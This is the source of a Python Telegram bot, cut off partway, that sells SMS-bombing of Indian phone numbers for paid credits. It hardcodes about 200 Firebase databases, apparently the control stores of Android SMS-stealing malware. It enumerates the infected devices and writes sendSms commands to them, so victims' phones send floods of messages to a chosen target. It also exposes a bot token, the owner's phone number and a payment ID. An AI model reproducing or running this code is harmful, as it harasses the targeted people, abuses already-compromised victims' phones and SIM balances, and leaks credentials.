#!/usr/bin/env python3
# 🔥 SUPER FAST UNLIMITED SMS BLAST + LIVE PROGRESS + PAYMENT APPROVAL 🔥

import re, os, requests, json, sqlite3, random, string, time, asyncio, threading, signal, sys, secrets
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, Bot
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from telegram.request import HTTPXRequest
from telegram.error import Conflict, NetworkError, TimedOut, RetryAfter

# ============================
# CONFIGURATION
# ============================
TOKEN = '8881226400:AAH7qky3qMsv6j97CiIHgaUuUcIV35fCwAU'   # 👈 NAYA TOKEN DAALO
OWNER_ID = 8535388961
OWNER_USERNAME = "@Dragon_X_1"

FORCE_CHANNEL_USERNAME = "Dragon_X_111"
FORCE_CHANNEL_LINK = "https://t.me/Dragon_X_111"

OWNER_CONTACT_USERNAME = "@Dragon_X_king1"
OWNER_CONTACT_LINK = "https://t.me/Dragon_X_king1"
OWNER_PHONE = "+380 98 781 8214"

UPI_ID = "cyberxst@ybl"
UPI_NAME = "vipin"

VIDEO_URLS = [
    "https://files.catbox.moe/iex2o2.mp4",
    "https://files.catbox.moe/n444eb.mp4",
    "https://files.catbox.moe/xf4tqz.mp4",
]

BTN_BOMB      = "💣 Sᴇɴᴅ Sᴍs"
BTN_CREDITS   = "💰 Cʀᴇᴅɪᴛs"
BTN_REFERRAL  = "🔗 Rᴇғᴇʀʀᴀʟ"
BTN_RECHARGE  = "💳 Rᴇᴄʜᴀʀɢᴇ"
BTN_HISTORY   = "📜 Hɪsᴛᴏʀʏ"
BTN_STATUS    = "🛡️ Sᴛᴀᴛᴜs"
BTN_DEV       = "👨‍💻 Dᴇᴠᴇʟᴏᴘᴇʀ"
BTN_REDEEM    = "🔑 Rᴇᴅᴇᴇᴍ"
BTN_ADMIN     = "⚙️ Aᴅᴍɪɴ Pᴀɴᴇʟ"
BTN_BUY       = "💳 Bᴜʏ Pʀᴇᴍɪᴜᴍ"

FIREBASE_URLS = [
    "https://vasu-panel-default-rtdb.firebaseio.com",
    "https://retameta-default-rtdb.firebaseio.com",
    "https://krishna4343-e45fd-default-rtdb.firebaseio.com",
    "https://kdbhai-25325-default-rtdb.firebaseio.com",
    "https://land-le-mera-default-rtdb.firebaseio.com",
    "https://kichudjdudh-default-rtdb.firebaseio.com",
    "https://mithun-da-default-rtdb.firebaseio.com",
    "https://ajay-5cac9-default-rtdb.firebaseio.com",
    "https://back-b40b7-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://pmnew230-default-rtdb.firebaseio.com",
    "https://rahul-panel-default-rtdb.firebaseio.com",
    "https://birend-b39e9-default-rtdb.firebaseio.com",
    "https://baba15-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mamu-4db6e-default-rtdb.firebaseio.com",
    "https://bihar-master-panel-fb7cd-default-rtdb.firebaseio.com",
    "https://bhai-138a8-default-rtdb.firebaseio.com",
    "https://raj-bhai-1c1ad-default-rtdb.firebaseio.com",
    "https://ranimukarji-1182a-default-rtdb.firebaseio.com",
    "https://biharibhaiya-c718b-default-rtdb.firebaseio.com",
    "https://shukla2-default-rtdb.firebaseio.com",
    "https://ranjit-58640-default-rtdb.firebaseio.com",
    "https://newpanel-4412c-default-rtdb.firebaseio.com",
    "https://bittu3pannel-default-rtdb.firebaseio.com",
    "https://lalan-c7e44-default-rtdb.firebaseio.com",
    "https://uffuuf-d1a3c-default-rtdb.firebaseio.com",
    "https://fir-new-3-b572a-default-rtdb.firebaseio.com",
    "https://lol40-5bab7-default-rtdb.firebaseio.com",
    "https://rajaji-8d135-default-rtdb.firebaseio.com",
    "https://panelwalababa-ddd53-default-rtdb.firebaseio.com",
    "https://vikash-da-default-rtdb.firebaseio.com",
    "https://rea72-1566e-default-rtdb.firebaseio.com",
    "https://hospital-new-11-default-rtdb.firebaseio.com",
    "https://nowammyxdd-default-rtdb.firebaseio.com",
    "https://jujuboorchodi-default-rtdb.firebaseio.com",
    "https://seuihd-default-rtdb.firebaseio.com",
    "https://suman0h55-default-rtdb.firebaseio.com",
    "https://whithex-741e0-default-rtdb.firebaseio.com",
    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://expert-5e1a0-default-rtdb.firebaseio.com",
    "https://jakepau-default-rtdb.firebaseio.com",
    "https://raj-londa-49db5-default-rtdb.firebaseio.com",
    "https://pm280reolc-default-rtdb.firebaseio.com",
    "https://botsieeee-af07c-default-rtdb.firebaseio.com",
    "https://topx-e09c6-default-rtdb.firebaseio.com",
    "https://lallo-6d4c5-default-rtdb.firebaseio.com",
    "https://second-wife-2-default-rtdb.firebaseio.com",
    "https://nand-d09e7-default-rtdb.firebaseio.com",
    "https://krishna5454-94fc5-default-rtdb.firebaseio.com",
    "https://asda-271a6-default-rtdb.firebaseio.com",
    "https://trigonnnnnnnn-default-rtdb.firebaseio.com",
    "https://xxxdrafft-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://arun-4024e-default-rtdb.firebaseio.com",
    "https://landlele-20855-default-rtdb.firebaseio.com",
    "https://arjun-singh-43d2f-default-rtdb.firebaseio.com",
    "https://dark-ka-app-default-rtdb.firebaseio.com",
    "https://nidhi-rani-default-rtdb.firebaseio.com",
    "https://nitu-23980-default-rtdb.firebaseio.com",
    "https://krijhjuiiiccyy-default-rtdb.firebaseio.com",
    "https://rahul-g11-default-rtdb.firebaseio.com",
    "https://rto-56-6cccf-default-rtdb.firebaseio.com",
    "https://download-b7393-default-rtdb.firebaseio.com",
    "https://rohet10-8919f-default-rtdb.firebaseio.com",
    "https://lol11-7da1c-default-rtdb.firebaseio.com",
    "https://ankitpanel-59086-default-rtdb.firebaseio.com",
    "https://rason00-default-rtdb.firebaseio.com",
    "https://ne-2db23-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://itslooksexp-default-rtdb.firebaseio.com",
    "https://raj-madarchodo-default-rtdb.firebaseio.com",
    "https://admin-sonu-8a567-default-rtdb.firebaseio.com",
    "https://randipelega-default-rtdb.firebaseio.com",
    "https://e21turnament2-default-rtdb.firebaseio.com",
    "https://ambani-19a25-default-rtdb.firebaseio.com",
    "https://sonuganduu-9d4da-default-rtdb.firebaseio.com",
    "https://gadhalalund-default-rtdb.firebaseio.com",
    "https://ahmedpanel-76b9c-default-rtdb.firebaseio.com",
    "https://khanipanel-d58cf-default-rtdb.firebaseio.com",
    "https://jyotiya75-default-rtdb.firebaseio.com",
    "https://saanvi-ji95-default-rtdb.firebaseio.com",
    "https://rto8-7f24f-default-rtdb.firebaseio.com",
    "https://penal-a93a8-default-rtdb.firebaseio.com",
    "https://ubhanhazx-default-rtdb.firebaseio.com",
    "https://pikachu-customer-16-default-rtdb.firebaseio.com",
    "https://e8383jsndn-default-rtdb.firebaseio.com",
    "https://saimharshji-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mypnl01-ush-default-rtdb.firebaseio.com",
    "https://proof-abf73-default-rtdb.firebaseio.com",
    "https://apna3-e04f8-default-rtdb.firebaseio.com",
    "https://bola-2a0d3-default-rtdb.firebaseio.com",
    "https://lol24-95c49-default-rtdb.firebaseio.com",
    "https://fatmaadminpanel-default-rtdb.firebaseio.com",
    "https://rahulsharma-13303-default-rtdb.firebaseio.com",
    "https://myypppp-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://shsh-fb9c8-default-rtdb.firebaseio.com",
    "https://raj-panel-3e09a-default-rtdb.firebaseio.com",
    "https://khanpanel-c31a2-default-rtdb.firebaseio.com",
    "https://pornllllll-default-rtdb.firebaseio.com",
    "https://riyy-e012e-default-rtdb.firebaseio.com",
    "https://rajanmadarchod-fa98d-default-rtdb.firebaseio.com",
    "https://workohplic-default-rtdb.firebaseio.com",
    "https://panel-no-21-default-rtdb.firebaseio.com",
    "https://comkingdir-default-rtdb.firebaseio.com",
    "https://badka-3181b-default-rtdb.firebaseio.com",
    "https://kalui-a8e2b-default-rtdb.firebaseio.com",
    "https://vickyadmin45-default-rtdb.firebaseio.com",
    "https://iqrapanel-2f21d-default-rtdb.firebaseio.com",
    "https://rahul-8b7eb-default-rtdb.firebaseio.com",
    "https://bali-7acc3-default-rtdb.firebaseio.com",
    "https://firstlove2-1f2d9-default-rtdb.firebaseio.com",
    "https://sourav-f057d-default-rtdb.firebaseio.com",
    "https://pappuraj-714bd-default-rtdb.firebaseio.com",
    "https://astha-rani80-default-rtdb.firebaseio.com",
    "https://rohitbona-d8308-default-rtdb.firebaseio.com",
    "https://adityakaapp-default-rtdb.firebaseio.com",
    "https://hghg-6f0a8-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://tabuna-4e962-default-rtdb.firebaseio.com",
    "https://biki-3ae6e-default-rtdb.firebaseio.com",
    "https://adamm-green-default-rtdb.firebaseio.com",
    "https://gdgdgdgd-c1a32-default-rtdb.firebaseio.com",
    "https://nitish232626-default-rtdb.firebaseio.com",
    "https://amaat-a7916-default-rtdb.firebaseio.com",
    "https://project-1-16da0-default-rtdb.firebaseio.com",
    "https://aditya-9f66b-default-rtdb.firebaseio.com",
    "https://aya-tandi-default-rtdb.firebaseio.com",
    "https://ahmedpanel-e3d2d-default-rtdb.firebaseio.com",
    "https://mera-lala-default-rtdb.firebaseio.com",
    "https://iqrapanel-37c8d-default-rtdb.firebaseio.com",
    "https://baba-tillu-2-default-rtdb.firebaseio.com",
    "https://tuuui-60b15-default-rtdb.firebaseio.com",
    "https://fir-d327e-default-rtdb.firebaseio.com",
    "https://iiilsoee-default-rtdb.firebaseio.com",
    "https://vikasda-a78d5-default-rtdb.firebaseio.com",
    "https://polti-1317f-default-rtdb.firebaseio.com",
    "https://rahulbhi-default-rtdb.firebaseio.com",
    "https://arrun01-b1ece-default-rtdb.firebaseio.com",
    "https://rto-sandeep3-default-rtdb.firebaseio.com",
    "https://xrafaf-bfe94-default-rtdb.firebaseio.com",
    "https://vijay-afb12-default-rtdb.firebaseio.com",
    "https://rontem-a082b-default-rtdb.firebaseio.com",
    "https://adultapk-c3c4f-default-rtdb.firebaseio.com",
    "https://harrwp-6be36-default-rtdb.firebaseio.com",
    "https://pmnew157-default-rtdb.firebaseio.com",
    "https://madam-ji-17e1c-default-rtdb.firebaseio.com",
    "https://ramu-c81a7-default-rtdb.firebaseio.com",
    "https://pm-kisan-22f92-default-rtdb.firebaseio.com",
    "https://mainapanel-cleint-default-rtdb.firebaseio.com",
    "https://allinone-cf029-default-rtdb.firebaseio.com",
    "https://ramjidost-default-rtdb.firebaseio.com",
    "https://demon-4-default-rtdb.firebaseio.com",
    "https://hkfs-38ed5-default-rtdb.firebaseio.com",
    "https://ashishraj2-7e2e2-default-rtdb.firebaseio.com",
    "https://ak-boss-3a292-default-rtdb.firebaseio.com",
    "https://yellowpanel-9f036-default-rtdb.firebaseio.com",
    "https://tanvi-ji77-default-rtdb.firebaseio.com",
    "https://raj-admin-nokia-default-rtdb.firebaseio.com",
    "https://maxjoker98-2b75f-default-rtdb.firebaseio.com",
    "https://sagarguddu-268cb-default-rtdb.firebaseio.com",
    "https://akdk-f23fa-default-rtdb.firebaseio.com",
    "https://tracegod-168d5-default-rtdb.firebaseio.com",
    "https://uday-gaw-default-rtdb.firebaseio.com",
    "https://abhirt-58f65-default-rtdb.firebaseio.com",
    "https://krish-gana-default-rtdb.firebaseio.com",
    "https://e10ttqaq-default-rtdb.firebaseio.com",
    "https://oooo-2f098-default-rtdb.firebaseio.com",
    "https://subhash-45fb2-default-rtdb.firebaseio.com",
    "https://commotazee-darkness-default-rtdb.firebaseio.com",
    "https://kanak-ji99-default-rtdb.firebaseio.com",
    "https://saiyaraaa-ee8c4-default-rtdb.firebaseio.com",
    "https://priyaknn-3e914-default-rtdb.firebaseio.com",
    "https://urmila-ji12-default-rtdb.firebaseio.com",
    "https://amulyaji8080-default-rtdb.firebaseio.com",
    "https://lucky-c0915-default-rtdb.firebaseio.com",
    "https://priya-cfdb7-default-rtdb.firebaseio.com",
    "https://alwayssukuna-4dbb7-default-rtdb.firebaseio.com",
    "https://jrahh-83b83-default-rtdb.firebaseio.com",
    "https://videocalls-f3434-default-rtdb.firebaseio.com",
    "https://mama-ji-09-default-rtdb.firebaseio.com",
    "https://dark-1b5d9-default-rtdb.firebaseio.com",
    "https://sakshi1-dfc80-default-rtdb.firebaseio.com",
    "https://gojohere-29ab1-default-rtdb.firebaseio.com",
    "https://zamzam-baba77-default-rtdb.firebaseio.com",
    "https://ankit-raj-chutiya-default-rtdb.firebaseio.com",
    "https://akdh-e4bf4-default-rtdb.firebaseio.com",
    "https://arda-2fc05-default-rtdb.firebaseio.com",
    "https://amit-6f40a-default-rtdb.firebaseio.com",
    "https://usa-n-landon-default-rtdb.firebaseio.com",
    "https://hjmi-5af19-default-rtdb.firebaseio.com",
    "https://chumma-70293-default-rtdb.firebaseio.com",
    "https://hdfc-chodo-default-rtdb.firebaseio.com",
    "https://ravindra-d7887-default-rtdb.firebaseio.com",
    "https://ak47-e3976-default-rtdb.firebaseio.com",
    "https://mkdg-6a8f6-default-rtdb.firebaseio.com",
    "https://arunku25-9479d-default-rtdb.firebaseio.com",
    "https://ajio-427d1-default-rtdb.firebaseio.com",
    "https://htbc51-default-rtdb.firebaseio.com",
    "https://rurukatiu-default-rtdb.firebaseio.com",
    "https://new-panel-1e4a9-default-rtdb.firebaseio.com",
    "https://vasu-3rd-panel-default-rtdb.firebaseio.com",
    "https://rrt1-c797a-default-rtdb.firebaseio.com",
    "https://akumar-12eb3-default-rtdb.firebaseio.com",
    "https://riya-f1832-default-rtdb.firebaseio.com",
    "https://ghostx-panel-default-rtdb.firebaseio.com",
    "https://rajendra-2934a-default-rtdb.firebaseio.com",
    "https://e-challan-54-default-rtdb.firebaseio.com",
    "https://vrajbhai-4aa6e-default-rtdb.firebaseio.com",
    "https://hacker-panel-dcc53-default-rtdb.firebaseio.com",
    "https://atifhehu-7ec17-default-rtdb.firebaseio.com",
    "https://private-522a9-default-rtdb.firebaseio.com",
    "https://bittu-panal-cleint-default-rtdb.firebaseio.com",
    "https://soni-bbb64-default-rtdb.firebaseio.com",
    "https://zxcvbnm-13fb3-default-rtdb.firebaseio.com",
    "https://rahu-96df7-default-rtdb.firebaseio.com",
    "https://courier40-30jan-default-rtdb.firebaseio.com",
    "https://fixhogya-5b6e3-default-rtdb.firebaseio.com",
    "https://bega-8457c-default-rtdb.firebaseio.com",
    "https://mr-dr-72761-default-rtdb.firebaseio.com",
    "https://sintuadmin-default-rtdb.firebaseio.com",
    "https://vijayda-default-rtdb.firebaseio.com",
    "https://rto-47-b39f4-default-rtdb.firebaseio.com",
    "https://maja-1c323-default-rtdb.firebaseio.com",
    "https://benga-7d896-default-rtdb.firebaseio.com",
    "https://bipin-57f82-default-rtdb.firebaseio.com",
    "https://sumankr5764-e0ba8-default-rtdb.firebaseio.com",
    "https://kattapa-7faf3-default-rtdb.firebaseio.com",
    "https://rahudf-default-rtdb.firebaseio.com",
    "https://udyydfuuhc-default-rtdb.firebaseio.com",
]

REQUEST_TIMEOUT = 1.5
MAX_CYCLES = 999999
MAX_DEVICES_PER_URL = 999999
MAX_CONCURRENT = 200     # 500 se 200 kar diya (flood kam)
BATCH_SIZE = 5000
BULK_TIMEOUT = 30

_device_cache = {
    "data": {"total": 0, "urls": 0, "url_devices": {}, "all_devices": [], "last_updated": 0},
    "timestamp": 0
}
_CACHE_TTL = 300
_background_refresh_running = False
_cache_ready = threading.Event()

DB_PATH = "bot_data.db"
_db_conn = None

def get_db():
    global _db_conn
    if _db_conn is None:
        _db_conn = sqlite3.connect(DB_PATH, timeout=10, check_same_thread=False)
        _db_conn.row_factory = sqlite3.Row
    return _db_conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, credits INTEGER DEFAULT 5,
        referrer_id INTEGER, joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS banned_users (
        user_id INTEGER PRIMARY KEY, banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, banned_by INTEGER)''')
    c.execute('''CREATE TABLE IF NOT EXISTS payments (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER,
        credits_given INTEGER, transaction_id TEXT, screenshot_id TEXT,
        status TEXT DEFAULT 'pending', created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, action TEXT,
        details TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS config (
        key TEXT PRIMARY KEY, value TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS force_join_verified (
        user_id INTEGER PRIMARY KEY, verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS bomb_attempts (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, phone TEXT,
        attempts INTEGER DEFAULT 1, last_attempt TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS redeem_keys (
        key TEXT PRIMARY KEY, credits INTEGER, max_uses INTEGER DEFAULT 1,
        used_count INTEGER DEFAULT 0, expiry_days INTEGER, created_by INTEGER,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, expiry_at TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS key_redemptions (
        id INTEGER PRIMARY KEY AUTOINCREMENT, key TEXT, user_id INTEGER,
        redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, UNIQUE(key, user_id))''')
    c.execute('''CREATE TABLE IF NOT EXISTS maintenance (
        id INTEGER PRIMARY KEY CHECK (id = 1),
        enabled INTEGER DEFAULT 0,
        message TEXT DEFAULT '🛠️ Bot is under maintenance. Please try again later.')''')
    conn.commit()
    c.execute("INSERT OR IGNORE INTO config(key, value) VALUES('owner_id', ?)", (str(OWNER_ID),))
    c.execute("INSERT OR IGNORE INTO maintenance(id, enabled) VALUES(1, 0)")
    conn.commit()

init_db()

def get_owner_id(): return OWNER_ID
def is_owner(uid): return uid == OWNER_ID

def is_maintenance_on():
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT enabled FROM maintenance WHERE id=1")
    row = c.fetchone()
    return bool(row[0]) if row else False

def set_maintenance(enabled: bool, message: str = None):
    conn = get_db(); c = conn.cursor()
    if message:
        c.execute("UPDATE maintenance SET enabled=?, message=? WHERE id=1", (1 if enabled else 0, message))
    else:
        c.execute("UPDATE maintenance SET enabled=? WHERE id=1", (1 if enabled else 0,))
    conn.commit()

def get_maintenance_message():
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT message FROM maintenance WHERE id=1")
    row = c.fetchone()
    return row[0] if row else "🛠️ Bot is under maintenance."

def get_user_credits(uid):
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT credits FROM users WHERE user_id=?", (uid,))
    row = c.fetchone()
    if row: return row[0]
    add_new_user(uid); return 5

def add_new_user(uid, ref=None):
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE user_id=?", (uid,))
    if c.fetchone(): return
    c.execute("INSERT INTO users(user_id,credits,referrer_id) VALUES(?,?,?)", (uid,5,ref))
    conn.commit()
    if ref and ref != uid:
        c.execute("UPDATE users SET credits=credits+1 WHERE user_id=?", (ref,))
        conn.commit()

def get_all_users():
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT user_id, credits, joined_at FROM users ORDER BY joined_at DESC")
    return c.fetchall()

def get_banned_count():
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM banned_users")
    return c.fetchone()[0]

def deduct_credit(uid):
    conn = get_db(); c = conn.cursor()
    c.execute("UPDATE users SET credits=credits-1 WHERE user_id=? AND credits>0", (uid,))
    a = c.rowcount; conn.commit(); return a > 0

def add_credits(uid, amt):
    conn = get_db(); c = conn.cursor()
    c.execute("UPDATE users SET credits=credits+? WHERE user_id=?", (amt, uid))
    conn.commit()

def remove_credits(uid, amt):
    conn = get_db(); c = conn.cursor()
    c.execute("UPDATE users SET credits=credits-? WHERE user_id=? AND credits>=?", (amt, uid, amt))
    a = c.rowcount; conn.commit(); return a > 0

def ban_user(uid, by):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO banned_users(user_id,banned_by) VALUES(?,?)", (uid, by))
        conn.commit(); return True
    except: return False

def unban_user(uid):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("DELETE FROM banned_users WHERE user_id=?", (uid,))
        a = c.rowcount; conn.commit(); return a > 0
    except: return False

def is_user_banned(uid):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT user_id FROM banned_users WHERE user_id=?", (uid,))
        return c.fetchone() is not None
    except: return False

def create_payment(uid, amt, cr, txn=None, ss=None):
    conn = get_db(); c = conn.cursor()
    c.execute("INSERT INTO payments(user_id,amount,credits_given,transaction_id,screenshot_id,status) VALUES(?,?,?,?,?,'pending')", (uid, amt, cr, txn, ss))
    pid = c.lastrowid; conn.commit(); return pid

def log_user_action(uid, action, details=""):
    conn = get_db(); c = conn.cursor()
    c.execute("INSERT INTO user_history(user_id,action,details) VALUES(?,?,?)", (uid, action, details))
    conn.commit()

def get_user_history(uid, limit=10):
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT action,details,created_at FROM user_history WHERE user_id=? ORDER BY id DESC LIMIT ?", (uid, limit))
    return c.fetchall()

def get_referral_link(uid, bot_uname):
    return f"https://t.me/{bot_uname}?start=ref_{uid}"

def log_bomb_attempt(user_id, phone):
    conn = get_db(); c = conn.cursor()
    c.execute("INSERT INTO bomb_attempts(user_id, phone) VALUES(?,?)", (user_id, phone))
    conn.commit()

def get_recent_bombs(limit=10):
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT user_id, phone, attempts, last_attempt FROM bomb_attempts ORDER BY last_attempt DESC LIMIT ?", (limit,))
    return c.fetchall()

def generate_redeem_key(credits, days=30, max_uses=1, created_by=None):
    key = "X4X-" + secrets.token_hex(4).upper() + "-" + secrets.token_hex(4).upper()
    conn = get_db(); c = conn.cursor()
    expiry_at = datetime.now().timestamp() + (days * 86400)
    c.execute("INSERT INTO redeem_keys(key, credits, max_uses, expiry_days, created_by, expiry_at) VALUES(?,?,?,?,?,?)",
              (key, credits, max_uses, days, created_by, expiry_at))
    conn.commit()
    return key

def redeem_key(user_id, key):
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT credits, max_uses, used_count, expiry_at FROM redeem_keys WHERE key=?", (key.upper(),))
    row = c.fetchone()
    if not row: return False, "❌ Invalid Key!"
    credits, max_uses, used_count, expiry_at = row
    if datetime.now().timestamp() > expiry_at: return False, "❌ Key Expired!"
    if used_count >= max_uses: return False, "❌ Key Already Used!"
    c.execute("SELECT 1 FROM key_redemptions WHERE key=? AND user_id=?", (key.upper(), user_id))
    if c.fetchone(): return False, "❌ You Already Used This Key!"
    add_credits(user_id, credits)
    c.execute("UPDATE redeem_keys SET used_count = used_count + 1 WHERE key=?", (key.upper(),))
    c.execute("INSERT INTO key_redemptions(key, user_id) VALUES(?,?)", (key.upper(), user_id))
    conn.commit()
    log_user_action(user_id, "Redeem", f"{credits} credits from {key}")
    return True, f"✅ {credits} Credits Added!"

def get_all_keys():
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT key, credits, max_uses, used_count, expiry_at FROM redeem_keys ORDER BY created_at DESC LIMIT 20")
    return c.fetchall()

def delete_key(key):
    conn = get_db(); c = conn.cursor()
    c.execute("DELETE FROM redeem_keys WHERE key=?", (key.upper(),))
    a = c.rowcount; conn.commit(); return a > 0

def fetch_clients_sync(url):
    try:
        base = url.rstrip('/')
        all_devices = []
        for path in ["All_Users", "Verify_Device", "clients"]:
            try:
                r = requests.get(f"{base}/{path}.json?shallow=true", timeout=1.5)
                if r.status_code == 200:
                    d = r.json()
                    if d and isinstance(d, dict): all_devices.extend(list(d.keys()))
            except: pass
        if not all_devices:
            try:
                r = requests.get(f"{base}/.json?shallow=true", timeout=1.5)
                if r.status_code == 200:
                    d = r.json()
                    if d and isinstance(d, dict): all_devices.extend(list(d.keys()))
            except: pass
        if all_devices:
            return {dev: True for dev in all_devices}
        return None
    except:
        return None

def refresh_device_cache_sync():
    global _device_cache
    all_devices = []
    url_devices = {}
    working_urls = 0
    total = 0

    def check_url(url):
        try:
            clients = fetch_clients_sync(url)
            if clients and isinstance(clients, dict):
                devices = list(clients.keys())[:MAX_DEVICES_PER_URL]
                return url, devices
            return url, []
        except:
            return url, []

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(check_url, url): url for url in FIREBASE_URLS}
        for future in as_completed(futures):
            try:
                url, devices = future.result(timeout=5)
                if devices:
                    url_devices[url] = devices
                    all_devices.extend(devices)
                    total += len(devices)
                    working_urls += 1
                else:
                    url_devices[url] = []
            except:
                pass

    _device_cache["data"] = {
        "total": total, "urls": working_urls, "url_devices": url_devices,
        "all_devices": all_devices, "last_updated": time.time()
    }
    _device_cache["timestamp"] = time.time()
    _cache_ready.set()
    print(f"✅ Cache ready: {total} devices from {working_urls} URLs")

def get_cached_devices(force_refresh=False):
    global _device_cache
    now = time.time()
    if not force_refresh and (now - _device_cache["timestamp"] < _CACHE_TTL):
        return _device_cache["data"]
    if not _background_refresh_running:
        threading.Thread(target=background_refresh, daemon=True).start()
    return _device_cache["data"]

def background_refresh():
    global _background_refresh_running
    _background_refresh_running = True
    try: refresh_device_cache_sync()
    except Exception as e: print(f"⚠️ {e}")
    _background_refresh_running = False

def get_all_working_devices():
    data = get_cached_devices()
    all_devices = data.get("all_devices", [])
    if not all_devices:
        _cache_ready.wait(timeout=5)
        data = _device_cache["data"]
        all_devices = data.get("all_devices", [])
    return all_devices

def get_devices_for_url(url):
    data = get_cached_devices()
    return data.get("url_devices", {}).get(url, [])

def _send_sms_blocking(url, dev_id, number, message):
    try:
        base = url.rstrip('/')
        data = {"sim": 1, "to": number, "message": message, "isSended": False}
        paths = [
            f"clients/{dev_id}/webhookEvent/sendSms.json",
            f"All_Users/{dev_id}/webhookEvent/sendSms.json",
            f"Verify_Device/{dev_id}/webhookEvent/sendSms.json",
        ]
        for path in paths:
            try:
                full = f"{base}/{path}"
                r = requests.put(full, json=data, timeout=1.5)
                if r.status_code in (200, 201):
                    return True
            except:
                continue
        return False
    except:
        return False

def generate_otp(length=6):
    return ''.join(random.choices(string.digits, k=length))

def validate_phone_number(num):
    num = num.strip()
    if not num.startswith('+91'): return False, "❌ +91 sᴇ sʜᴜʀᴜ ᴋᴀʀᴏ 📱"
    rem = num[3:]
    if not rem.isdigit(): return False, "❌ Sɪʀғ Dɪɢɪᴛs 🔢"
    if len(rem) != 10: return False, "❌ 10 Dɪɢɪᴛs Dᴏ ⚠️"
    return True, "✅ Sᴀʜɪ Hᴀɪ 🎯"

def get_main_keyboard(uid=None):
    rows = [
        [KeyboardButton(BTN_BOMB)],
        [KeyboardButton(BTN_CREDITS), KeyboardButton(BTN_REDEEM)],
        [KeyboardButton(BTN_REFERRAL), KeyboardButton(BTN_RECHARGE)],
        [KeyboardButton(BTN_HISTORY), KeyboardButton(BTN_STATUS)],
        [KeyboardButton(BTN_BUY)],
    ]
    if uid and is_owner(uid):
        rows.append([KeyboardButton(BTN_ADMIN)])
    rows.append([KeyboardButton(BTN_DEV)])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)

def set_force_join_verified(uid):
    conn = get_db(); c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO force_join_verified(user_id) VALUES(?)", (uid,))
    conn.commit()

def is_force_join_verified(uid):
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT user_id FROM force_join_verified WHERE user_id=?", (uid,))
    return c.fetchone() is not None

async def check_force_join(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if not update.effective_user or not update.effective_message:
        return False
    uid = update.effective_user.id
    if is_owner(uid): return True
    if is_force_join_verified(uid): return True
    try:
        member = await context.application.bot.get_chat_member(
            chat_id=f"@{FORCE_CHANNEL_USERNAME}", user_id=uid)
        if member.status in ("member", "administrator", "creator"):
            set_force_join_verified(uid); return True
    except: pass
    join_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Jᴏɪɴ Cʜᴀɴɴᴇʟ", url=FORCE_CHANNEL_LINK)],
        [InlineKeyboardButton("✅ I Jᴏɪɴᴇᴅ", callback_data="force_join_checked")]
    ])
    await update.effective_message.reply_text(
        "⚠️ <b>Fᴏʀᴄᴇ Jᴏɪɴ Rᴇǫᴜɪʀᴇᴅ!</b>\n\nJᴏɪɴ ᴏᴜʀ ᴄʜᴀɴɴᴇʟ ᴛᴏ ᴜsᴇ ᴛʜɪs ʙᴏᴛ.",
        parse_mode="HTML", reply_markup=join_markup)
    return False

async def check_maintenance(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if not update.effective_user or not update.effective_message:
        return False
    uid = update.effective_user.id
    if is_owner(uid): return False
    if is_maintenance_on():
        msg = get_maintenance_message()
        await update.effective_message.reply_text(
            f"🛠️ <b>MAINTENANCE MODE ON</b>\n\n{msg}\n\n⏳ Please try again later.",
            parse_mode="HTML")
        return True
    return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not update.effective_message:
        return
    uid = update.effective_user.id
    if is_user_banned(uid):
